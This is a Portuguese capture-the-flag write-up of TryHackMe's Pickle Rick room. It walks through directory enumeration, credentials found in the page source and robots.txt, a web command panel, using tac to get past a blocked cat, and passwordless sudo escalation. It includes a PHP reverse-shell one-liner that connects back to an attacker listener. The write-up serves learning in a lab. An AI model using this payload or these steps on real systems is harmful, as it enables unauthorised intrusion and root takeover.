# CTF-Pickle-Rick-Write-up
Passo a passo de todos os desafios enfrentados durante o Capture The Flag temático de Rick and Morty da TryHackMe.

🥒 Pickle Rick CTF — TryHackMe

Walkthrough / Write-up

📌 Introdução

Este documento apresenta o walkthrough completo do desafio Pickle Rick, disponível na plataforma TryHackMe, detalhando todas as etapas de reconhecimento, enumeração, exploração e escalonamento de privilégios realizadas até a obtenção das três flags (ingredientes).

O objetivo do desafio é localizar três ingredientes escondidos no sistema alvo, explorando falhas em uma aplicação web e no sistema operacional subjacente.

Toda a atividade foi realizada com fins educacionais, em um ambiente controlado de laboratório.

🧪 Ambiente e Preparação

Plataforma: TryHackMe

Máquina atacante: Kali Linux

Conexão: VPN do TryHackMe

IP do alvo: 10.64.173.82

Após estabelecer a conexão VPN com sucesso, iniciei o processo de reconhecimento do alvo.

🔎 Reconhecimento Inicial (Reconnaissance)

O primeiro passo foi verificar se o endereço IP hospedava alguma aplicação web.

Ao acessar o IP pelo navegador:

http://10.64.173.82


Foi apresentada uma página simples contendo a frase:

Rick is sup4r cool

📄 Análise do Código-Fonte

Utilizando o recurso View Page Source do navegador, foi identificado o seguinte comentário no código HTML:

Username: R1ckRul3s


Isso indicou a possível existência de um sistema de autenticação utilizando esse nome de usuário.

Uma tentativa direta de acessar /login não retornou resposta válida, indicando que a rota poderia estar oculta ou possuir outro nome.

🌐 Enumeração de Portas (Nmap)

Para identificar serviços ativos no host, foi realizada uma varredura com Nmap, que revelou:

Porta 80 — HTTP

Porta 22 — SSH

Isso indicou duas superfícies principais de ataque:

Uma aplicação web

Um possível acesso remoto via SSH

📁 Enumeração de Diretórios (Gobuster)

Com foco inicial na aplicação web, utilizei o Gobuster para enumerar diretórios ocultos.

Primeira enumeração:
gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt


Entre os caminhos encontrados, destaque para:

/assets

/index.html

/robots.txt

🤖 Análise do robots.txt

Ao acessar /robots.txt, foi encontrado o seguinte conteúdo:

Wubbalubbadubdub


Esse valor levantou a hipótese de ser uma senha, possivelmente relacionada ao username descoberto anteriormente.

Tentativas de acesso direto a diretórios protegidos (403) não tiveram sucesso neste momento.

🔍 Enumeração Avançada com Extensões

Para aprofundar a enumeração, foi utilizada uma wordlist maior e adicionada a busca por arquivos PHP:

gobuster dir -u $IP -w /usr/share/wordlists/dirb/big.txt -t 50 -x php


Observações técnicas:

-t 50: aumenta o número de threads (em ambientes reais, deve ser usado com cautela)

-x php: busca arquivos com extensão PHP, comum em aplicações web

Novos caminhos encontrados:

/portal.php

/denied.php

/login.php

🔐 Autenticação e Acesso ao Portal

Ao acessar /portal.php, foi apresentada uma tela de login.

Credenciais utilizadas:

Username: R1ckRul3s

Password: Wubbalubbadubdub

O login foi bem-sucedido e revelou um painel de comandos, caracterizando uma vulnerabilidade de Command Injection / Web Shell, permitindo a execução de comandos Linux diretamente pela aplicação.

🖥️ Exploração do Painel de Comandos

Inicialmente, foi executado:

ls -a


Entre os arquivos listados, estava:

Sup3rS3cretPickl3Ingred.txt


Ao tentar visualizar o conteúdo com cat, o comando estava bloqueado. Como alternativa, foi utilizado:

tac Sup3rS3cretPickl3Ingred.txt


✅ Primeira flag obtida com sucesso

📄 Arquivo de Dica

Outro arquivo encontrado foi clue.txt, que continha a seguinte mensagem:

"Look around the file system for the other ingredient."

Isso indicou que os próximos ingredientes não estariam diretamente no diretório atual.

🔁 Reverse Shell (Exploração Avançada)

Para obter um shell mais estável e interativo, foi realizada uma exploração via Reverse Shell, aproveitando a execução remota de comandos.

Verificação do Netcat:
which nc


Confirmada a presença do netcat no servidor.

Listener na máquina atacante (Kali):
nc -lvnp 443

Payload executado na aplicação:
php -r '$sock=fsockopen("IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'


Esse payload cria uma conexão TCP reversa utilizando file descriptors, redirecionando a entrada, saída e erros do shell remoto para a máquina atacante.

Após a conexão, executei:

bash -i


para tornar o shell totalmente interativo.

🗂️ Enumeração do Sistema de Arquivos

A partir do shell, naveguei até:

cd /home


No diretório do usuário Rick, foi encontrado o arquivo second ingredients, que continha a:

✅ Segunda flag

⬆️ Escalonamento de Privilégios

Para verificar permissões elevadas, foi executado:

sudo -l


O resultado indicou que o usuário atual podia executar qualquer comando como root sem senha.

Com isso, foi possível escalar privilégios facilmente:

sudo su -

🏁 Flag Final

Com acesso root, naveguei até:

cd /root


Onde foi encontrado o arquivo:

3rd.txt


✅ Terceira flag obtida
🎉 Desafio concluído com sucesso

🧠 Conclusão

Este desafio foi fundamental para consolidar conceitos práticos de Segurança Ofensiva, proporcionando experiência real em exploração de aplicações web e sistemas Linux.
